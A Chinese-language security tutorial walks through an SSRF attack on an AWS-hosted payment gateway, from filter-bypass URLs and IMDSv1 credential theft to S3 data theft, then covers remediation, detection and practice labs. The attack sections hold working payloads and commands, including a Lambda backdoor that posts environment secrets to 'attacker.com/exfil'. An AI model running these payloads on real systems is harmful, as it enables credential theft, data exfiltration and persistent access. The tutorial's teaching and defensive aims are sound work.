---
title: "SSRF攻击获取AWS临时凭据"
type: docs
weight: 2
---

## 案例二：SSRF攻击获取AWS临时凭据——从元数据服务到横向渗透全链路

### 背景与威胁态势

某金融科技公司的在线支付网关部署在 AWS EC2 实例上，后端使用 Python Flask 框架开发，提供了一个「URL 预览」功能供客服人员快速查看客户提交的链接内容。该功能接收用户传入的 URL 参数，由服务端发起 HTTP 请求并返回响应内容。由于缺乏对目标 URL 的安全校验，攻击者可构造恶意请求，让服务端访问其本不应触达的内部资源——这就是典型的服务端请求伪造（Server-Side Request Forgery, SSRF）漏洞。

在云环境中，SSRF 的危害远超传统内网渗透。AWS EC2 实例可以通过链路本地地址 `169.254.169.254` 访问实例元数据服务（Instance Metadata Service, IMDS），获取实例的 IAM 角色临时凭据。一旦凭据到手，攻击者便可冒充该实例的身份调用 AWS API，在云环境中横向移动、窃取数据，甚至创建后门持久化。

**真实世界中的同类事件**：2019 年 Capital One 数据泄露事件中，攻击者 Paige Thompson 正是利用 SSRF 漏洞访问 EC2 元数据服务获取 IAM 角色凭据，最终窃取了超过 1 亿用户的个人财务信息，造成超过 1.5 亿美元的损失。这不是理论推演，而是已被司法判决确认的实战案例。

### 攻击链全景图

```mermaid
graph LR
    A[发现 SSRF 漏洞] --> B[探测内网服务]
    B --> C[访问 IMDS 元数据]
    C --> D[获取 IAM 角色凭据]
    D --> E[枚举云资源权限]
    E --> F[横向移动与数据窃取]
    F --> G[持久化与痕迹清除]
    
    style A fill:#ff6b6b
    style D fill:#ffa500
    style G fill:#ff0000
```

### 攻击过程详解

#### 阶段一：发现与确认 SSRF 漏洞

**原理**：SSRF 漏洞的本质是应用在服务端发起 HTTP 请求时，未对目标地址进行有效校验。攻击者可通过传入内部地址（如 `127.0.0.1`、`169.254.169.254`、`10.0.0.0/8` 等）让服务端代为访问。

**探测方法**：

```bash
# 第一步：确认参数功能——正常外部请求
curl "https://target.com/fetch?url=https://httpbin.org/ip"
# 返回正常的外部 IP 信息，说明该参数确实由服务端发起请求

# 第二步：测试本地回环地址访问
curl "https://target.com/fetch?url=http://127.0.0.1:80/"
# 如果返回本地 Web 服务的默认页面，确认 SSRF 存在

# 第三步：尝试访问元数据服务地址
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# 返回实例元数据列表，这是 AWS EC2 的标志性响应
# 典型返回内容：
# ami-id
# ami-launch-index
# ami-manifest-path
# hostname
# iam/
# instance-id
# instance-type
# local-hostname
# local-ipv4
# ...
```

**绕过常见防御的进阶技巧**：

当目标应用对 URL 做了简单过滤时，攻击者可尝试以下绕过手段：

```bash
# 1. 十进制 IP 地址绕过
# 169.254.169.254 的十进制表示为 2852039166
curl "https://target.com/fetch?url=http://2852039166/latest/meta-data/"

# 2. 八进制 IP 地址
curl "https://target.com/fetch?url=http://0251.0376.0251.0376/latest/meta-data/"

# 3. IPv6 映射地址
curl "https://target.com/fetch?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/"

# 4. 利用 DNS 重绑定（DNS Rebinding）
# 注册一个域名，第一次解析返回合法 IP，TTL 过期后解析为 169.254.169.254
# 工具推荐：rbndr.us 或自建 DNS 服务器

# 5. 利用 URL 解析差异
curl "https://target.com/fetch?url=http://attacker.com@169.254.169.254/latest/meta-data/"

# 6. 使用 Enclosed Alphanumeric 字符
# ⓐ⑥⑨.②⑤④.①⑥⑨.②⑤④ —— 某些解析器会将这些字符转为普通数字

# 7. 通过 302 重定向
# 在攻击者服务器上设置重定向：
# https://attacker.com/redirect → 302 → http://169.254.169.254/latest/meta-data/
# 如果应用跟随重定向但不重新校验，即可绕过
```

| 绕过技术 | 适用场景 | 难度 | 可靠性 |
|----------|---------|------|--------|
| 十进制/八进制 IP | 简单 IP 黑名单 | 低 | 高 |
| IPv6 映射 | 仅过滤 IPv4 | 中 | 中 |
| DNS 重绑定 | 校验 DNS 解析结果 | 高 | 高 |
| URL 解析差异 | 基于正则的过滤 | 中 | 中 |
| 302 重定向 | 仅校验初始 URL | 低 | 高 |
| Enclosed Alphanumeric | 字符串匹配过滤 | 中 | 低 |

#### 阶段二：获取 IAM 角色信息

确认可访问元数据服务后，接下来枚举可用的 IAM 角色并获取临时凭据。

```bash
# 获取附加到该实例的 IAM 角色名称
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# 返回：ec2-webapp-role
# 如果返回多个角色名（极少见），每个都值得尝试

# 使用角色名获取临时凭据
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-webapp-role"
```

返回的 JSON 结构如下：

```json
{
  "Code": "Success",
  "LastUpdated": "2024-06-15T08:23:45Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAQNWGQXEXAMPLE",
  "SecretAccessKey": "YOUR_AWS_SECRET_KEY",
  "Token": "FwoGZXIvYXdzEBYaDHqa0AP1...很长的 Token 字符串...",
  "Expiration": "2024-06-15T14:23:45Z"
}
```

**关键字段说明**：

| 字段 | 含义 | 安全影响 |
|------|------|---------|
| `AccessKeyId` | 以 `ASIA` 开头的临时访问密钥 ID | 与永久密钥 `AKIA` 前缀区分 |
| `SecretAccessKey` | 临时密钥的签名密钥 | 配合 AccessKeyId 使用 |
| `Token` | 安全令牌（STS Session Token） | 三者缺一不可 |
| `Expiration` | 凭据过期时间 | 通常为 6-12 小时，需在此前利用 |

**获取更多元数据信息**（辅助后续攻击）：

```bash
# 实例 ID 和区域信息
curl "...?url=http://169.254.169.254/latest/meta-data/instance-id"
curl "...?url=http://169.254.169.254/latest/meta-data/placement/region"
# 返回：us-east-1

# 用户数据（可能包含启动脚本、密钥等敏感信息）
curl "...?url=http://169.254.169.254/latest/user-data"
# 这是 EC2 启动时注入的脚本，经常包含数据库密码、API Key 等

# 网络信息
curl "...?url=http://169.254.169.254/latest/meta-data/network/interfaces/macs/"
curl "...?url=http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/subnet-id"
curl "...?url=http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/vpc-id"
# 获取 VPC 和子网信息，辅助内网横向移动规划
```

#### 阶段三：利用临时凭据进行云资源枚举

拿到凭据后，攻击者可在自己的机器上配置 AWS CLI 进行操作：

```bash
# 配置临时凭据
export AWS_ACCESS_KEY_ID="ASIAQNWGQXEXAMPLE"
export AWS_SECRET_ACCESS_KEY="YOUR_AWS_SECRET_KEY"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBYaDHqa0AP1..."
export AWS_DEFAULT_REGION="us-east-1"

# 首先确认身份
aws sts get-caller-identity
# 返回：
# {
#     "UserId": "AROAQNWGQXEXAMPLE:i-0abcdef1234567890",
#     "Account": "123456789012",
#     "Arn": "arn:aws:sts::123456789012:assumed-role/ec2-webapp-role/i-0abcdef1234567890"
# }

# 枚举角色权限——尝试各种操作看哪些成功
# S3 操作
aws s3 ls
aws s3 ls s3://backup-bucket/ --recursive | head -20

# EC2 操作
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PrivateIpAddress,State.Name]' --output table

# RDS 操作
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Endpoint.Address,Engine]' --output table

# Lambda 操作
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime]' --output table

# Secrets Manager（高价值目标）
aws secretsmanager list-secrets --query 'SecretList[*].Name'

# SSM Parameter Store（经常存储配置和密钥）
aws ssm describe-parameters --query 'Parameters[*].Name'
```

**使用 enumerate-iam 工具自动化枚举**（推荐）：

```bash
# 安装
pip install enumerate-iam

# 运行——自动尝试数百种 API 调用，报告成功的操作
enumerate-iam --access-key ASIAQNWGQXEXAMPLE \
  --secret-key YOUR_AWS_SECRET_KEY \
  --session-token "FwoGZXIvYXdzEBYaDHqa0AP1..."
```

#### 阶段四：横向移动与数据窃取

**4.1 S3 数据窃取**

```bash
# 列出所有桶
aws s3 ls
# 2024-01-10  backup-prod-bucket
# 2024-03-05  config-store-bucket
# 2024-02-20  customer-data-bucket
# 2024-01-15  app-assets-bucket

# 下载敏感数据
aws s3 sync s3://customer-data-bucket/ ./loot/customer-data/
aws s3 cp s3://config-store-bucket/prod/database.yml ./loot/
aws s3 cp s3://backup-prod-bucket/secrets/ ./loot/secrets/ --recursive

# 查找高价值文件
aws s3 ls s3://config-store-bucket/ --recursive | grep -iE '\.env|password|secret|key|config|credentials|\.pem'
```

**4.2 数据库凭据提取与利用**

从 S3 配置文件中通常能找到数据库连接字符串：

```yaml
# 典型的 database.yml 内容
production:
  adapter: mysql2
  host: prod-db.cluster-abc123.us-east-1.rds.amazonaws.com
  username: app_readwrite
  password: SuperSecret2024!
  database: payment_db
```

```bash
# 使用提取的凭据连接 RDS
mysql -h prod-db.cluster-abc123.us-east-1.rds.amazonaws.com \
  -u app_readwrite -p'SuperSecret2024!' payment_db

# 数据库内操作
SHOW TABLES;
SELECT COUNT(*) FROM users;
SELECT email, phone FROM users LIMIT 10;
```

**4.3 利用 Lambda 创建持久后门**

如果角色具有 Lambda 写权限，可创建定时回连的后门函数：

```bash
# 创建回连脚本
cat > lambda_function.py << 'EOF'
import json
import urllib3
import subprocess

def lambda_handler(event, context):
    # 收集环境变量（通常包含大量密钥）
    env_vars = dict(os.environ)
    
    # 回传数据到攻击者服务器
    http = urllib3.PoolManager()
    http.request('POST', 'https://attacker.com/exfil', 
                 body=json.dumps(env_vars),
                 headers={'Content-Type': 'application/json'})
    
    return {'statusCode': 200}
EOF

zip function.zip lambda_function.py

aws lambda create-function \
  --function-name "health-check" \
  --runtime python3.12 \
  --role arn:aws:iam::123456789012:role/lambda-execution-role \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip

# 设置定时触发（每小时执行一次）
aws events put-rule --name "hourly-check" --schedule-expression "rate(1 hour)"
# ... 配置触发器
```

**4.4 EC2 实例横向移动**

```bash
# 枚举所有运行中的实例
aws ec2 describe-instances \
  --filters "Name=instance-state-name,Values=running" \
  --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,PrivateIpAddress,KeyName,SecurityGroups[*].GroupId]' \
  --output table

# 查看安全组规则，寻找可访问的内部服务
aws ec2 describe-security-groups \
  --group-ids sg-xxxxxxxx \
  --query 'SecurityGroups[*].IpPermissions'

# 如果有 EC2 创建权限，启动一个用于内网扫描的跳板机
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro \
  --subnet-id subnet-xxxxxxxx \
  --security-group-ids sg-xxxxxxxx \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=prod-monitor}]'
```

### IMDSv1 与 IMDSv2：为什么 v1 如此危险

本案例之所以成功，核心原因在于目标实例使用了 IMDSv1。理解两个版本的差异至关重要：

| 特性 | IMDSv1 | IMDSv2 |
|------|--------|--------|
| 请求方式 | 简单 HTTP GET | 先 PUT 获取 Token，再 GET |
| Token 机制 | 无 | 需要获取临时 Token |
| IP 绑定 | 无 | Token 与实例 IP 绑定 |
| SSRF 防护 | 无 | 有效防护（攻击者无法获取 Token） |
| 配置方式 | 默认启用 | 需设置 `HttpTokens=required` |
| 请求头要求 | 无 | 需 `X-aws-ec2-metadata-token` 头 |

**IMDSv2 如何防御 SSRF**：

```bash
# IMDSv2 的第一步：PUT 请求获取 Token
# 这一步必须从实例本地发起，且需要设置 TTL 头
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 第二步：用 Token 访问元数据
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/

# 关键：SSRF 通常只能发起 GET 请求
# 即使能发起 PUT 请求，攻击者也无法在请求头中携带正确的 Token
# 因为 Token 是在第一步由实例本地生成的，攻击者无法预先获取
```

**IMDSv2 的已知绕过（需了解的攻防知识）**：

- **HTTP 请求头注入**：在某些极端配置下（如存在 CRLF 注入漏洞），攻击者可能注入自定义请求头。但这是应用层漏洞，不是 IMDSv2 本身的缺陷。
- **容器网络配置不当**：如果 Docker 容器使用 `--net=host` 模式运行，容器内进程可以直接访问宿主机的元数据服务，绕过 IMDSv2 保护。
- **Token 泄露**：如果应用将 Token 写入日志或在错误信息中暴露，攻击者可复用该 Token。但 IMDSv2 Token 有效期短且与源 IP 绑定，实际利用难度很高。

### 发现的漏洞与风险评估

| 漏洞 | CVSS 评分 | 严重性 | 描述 |
|------|----------|--------|------|
| SSRF 漏洞 | 9.1 | 严重 | Web 应用 `/fetch` 端点未校验目标 URL，可访问任意内部地址 |
| IMDSv1 启用 | 8.8 | 严重 | 元数据服务使用 v1 版本，无需认证即可访问，SSRF 可直达凭据 |
| IAM 角色权限过大 | 8.5 | 严重 | `ec2-webapp-role` 拥有 S3 全读写、Lambda 创建、EC2 描述等权限，远超 Web 应用所需 |
| 无 WAF 规则 | 7.5 | 高 | 未部署 WAF 或未配置 SSRF 防护规则 |
| 缺乏网络分段 | 6.5 | 中 | 数据库端口从 Web 子网可达，未通过安全组严格限制 |
| 无元数据访问审计 | 5.5 | 中 | 未启用 CloudTrail 对元数据 API 调用的监控告警 |

### 修复方案

#### 紧急修复（24 小时内）

```bash
# 1. 强制 IMDSv2
aws ec2 modify-instance-metadata-options \
  --instance-id i-0abcdef1234567890 \
  --http-tokens required \
  --http-endpoint enabled

# 批量修改同 VPC 下所有实例（通过 AWS CLI + jq）
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].InstanceId' \
  --output text | tr '\t' '\n' | while read iid; do
    aws ec2 modify-instance-metadata-options \
      --instance-id "$iid" --http-tokens required
  done

# 2. 限制 IAM 角色权限——创建最小权限策略
cat > minimal-webapp-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject"
      ],
      "Resource": "arn:aws:s3:::app-assets-bucket/*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "s3:ListBucket"
      ],
      "Resource": "arn:aws:s3:::app-assets-bucket"
    },
    {
      "Effect": "Allow",
      "Action": [
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Resource": "arn:aws:logs:*:*:*"
    }
  ]
}
EOF
aws iam put-role-policy \
  --role-name ec2-webapp-role \
  --policy-name minimal-webapp \
  --policy-document file://minimal-webapp-policy.json

# 3. 吊销当前泄露的凭据（强制刷新）
aws iam update-assume-role-policy \
  --role-name ec2-webapp-role \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
# 这会立即使所有现有临时凭据失效
```

#### 短期修复（1 周内）

```python
# SSRF 防御：URL 白名单校验实现
from urllib.parse import urlparse
import ipaddress
import socket

BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # 链路本地地址，包含元数据服务
    ipaddress.ip_network('127.0.0.0/8'),
]

ALLOWED_DOMAINS = [
    'api.trusted-service.com',
    'cdn.legitimate-domain.com',
]

def validate_url(url: str) -> bool:
    """校验目标 URL 是否安全可访问"""
    parsed = urlparse(url)
    
    # 只允许 HTTP/HTTPS
    if parsed.scheme not in ('http', 'https'):
        return False
    
    hostname = parsed.hostname
    
    # 白名单域名检查
    if hostname not in ALLOWED_DOMAINS:
        return False
    
    # DNS 解析并检查 IP 范围
    try:
        resolved_ip = socket.gethostbyname(hostname)
        ip = ipaddress.ip_address(resolved_ip)
        for network in BLOCKED_NETWORKS:
            if ip in network:
                return False
    except (socket.gaierror, ValueError):
        return False
    
    # 禁止非标准端口
    port = parsed.port
    if port and port not in (80, 443):
        return False
    
    return True
```

```bash
# WAF 规则示例（AWS WAF）
# 阻止包含 169.254.x.x 的请求
aws wafv2 create-rule-group \
  --name ssrf-protection \
  --scope REGIONAL \
  --default-action '{"Allow":{}}' \
  --rules '[
    {
      "Name": "block-metadata-access",
      "Priority": 1,
      "Statement": {
        "ByteMatchStatement": {
          "SearchString": "169.254.169.254",
          "FieldToMatch": {"Body":{}},
          "TextTransformations": [{"Priority": 0, "Type": "NONE"}],
          "PositionalConstraint": "CONTAINS"
        }
      },
      "Action": {"Block":{}},
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": "block-metadata"
      }
    }
  ]' \
  --visibility-config '{"SampledRequestsEnabled":true,"CloudWatchMetricsEnabled":true,"MetricName":"ssrf-protection"}'
```

#### 长期防御体系

| 层次 | 措施 | 实现方式 |
|------|------|---------|
| 代码层 | 输入校验 | URL 白名单 + DNS 解析后二次校验 + 禁止重定向 |
| 运行时 | 沙箱隔离 | 容器网络策略禁止访问 169.254.0.0/16 |
| 网络层 | 安全组限制 | Web 子网安全组出站规则拒绝元数据地址 |
| 平台层 | IMDSv2 | 强制所有实例使用 IMDSv2 |
| 监控层 | 异常检测 | CloudWatch 告警：同一角色凭据从不同 IP 使用 |
| 审计层 | 日志分析 | CloudTrail 监控敏感 API 调用（`s3:GetObject`、`lambda:CreateFunction` 等） |
| 策略层 | SCP 限制 | 组织级 SCP 禁止成员账户关闭 IMDSv2 |

### 检测与监控

**CloudTrail 日志分析——检测凭据滥用**：

```sql
-- Athena 查询：检测同一角色从多个 IP 使用
SELECT 
  useridentity.arn,
  sourceipaddress,
  COUNT(*) as request_count,
  MIN(eventtime) as first_seen,
  MAX(eventtime) as last_seen
FROM cloudtrail_logs
WHERE eventname IN ('GetObject', 'ListBuckets', 'CreateFunction')
  AND useridentity.type = 'AssumedRole'
  AND eventtime > date_format(date_add('day', -1, current_timestamp), '%Y-%m-%dT%H:%i:%sZ')
GROUP BY useridentity.arn, sourceipaddress
ORDER BY request_count DESC;
```

**GuardDuty 规则示例**：

AWS GuardDuty 内置了 `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` 检测规则，当 EC2 实例的临时凭据被用于实例外部的 API 调用时自动触发告警。确认该功能已启用：

```bash
aws guardduty list-detectors
aws guardduty get-detector --detector-id <detector-id>
```

### 常见误区与易错点

**误区一：「我们有防火墙，SSRF 不是问题」**
传统防火墙无法阻止 SSRF，因为恶意请求来自受信任的应用服务器。请求是「合法」的——防火墙看到的是 Web 服务器在访问元数据服务，这在正常业务流程中是可能发生的。

**误区二：「IMDSv2 启用了就万事大吉」**
IMDSv2 是必要的，但不是充分的。如果应用存在命令注入漏洞，攻击者可在实例上直接执行 `curl` 命令获取 Token。根本性修复必须在 SSRF 漏洞本身。

**误区三：「角色权限只给了 S3 读取，问题不大」**
即使是只读权限，攻击者也可以读取包含数据库密码的配置文件、读取用户数据备份、读取 Lambda 环境变量中的 API Key。权限最小化不仅要考虑 AWS 操作类型，还要考虑资源范围（哪些桶、哪些对象）。

**误区四：「临时凭据 6 小时后自动过期，等一等就好」**
6 小时足够攻击者完成所有操作。而且如果角色有 IAM 写权限，攻击者可以在过期前创建持久化后门（如新的 IAM 用户或 Lambda 函数），过期也不影响。

### 举一反三：其他云平台的类似攻击

**Azure**：实例元数据地址同为 `169.254.169.254`，但路径和认证机制不同。

```bash
# Azure 需要特殊的请求头
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 获取 Managed Identity 令牌
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**GCP**：元数据服务器地址为 `metadata.google.internal`。

```bash
# GCP 需要 Metadata-Flavor 头
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# GCP 的特殊风险：如果项目启用了 legacy metadata endpoints
# 即使 v0.1 被禁用，v1 仍然可能暴露信息
```

### 练习与复现

在合法的靶场环境中练习本案例涉及的全部技术：

| 平台 | 靶场名称 | 覆盖技能 |
|------|---------|---------|
| HackTheBox | Cloud Challenges | SSRF + IMDS 利用 |
| TryHackMe | AWS Basics for Security Engineers | 元数据服务攻击 |
| AWSGoat | github.com/ine-labs/AWSGoat | 完整的 AWS 攻防链路 |
| CloudFoxable | github.com/BishopFox/cloudfoxable | IAM 权限枚举与利用 |
| Pacu | github.com/RhinoSecurityLabs/pacu | AWS 渗透测试框架 |

```bash
# Pacu 实战——自动化 AWS 渗透
pip install pacu
pacu

# 在 Pacu 中使用 EC2 模块
Pacu> run iam__enum_users_roles_policies_groups
Pacu> run ec2__enum
Pacu> run s3__bucket_finder
Pacu> run lambda__backdoor_new_roles
```

***

> **案例要点回顾**：本案例展示了一条完整的「SSRF → 元数据 → 凭据窃取 → 横向移动」攻击链。核心教训是：云环境中的每一个漏洞都不是孤立的——一个看似低危的 SSRF，在云元数据服务和过度授权的 IAM 角色配合下，足以演变为灾难级的数据泄露事件。防御的关键在于纵深：IMDSv2 强制启用、IAM 最小权限、网络分段、WAF 防护、实时监控告警，缺一不可。
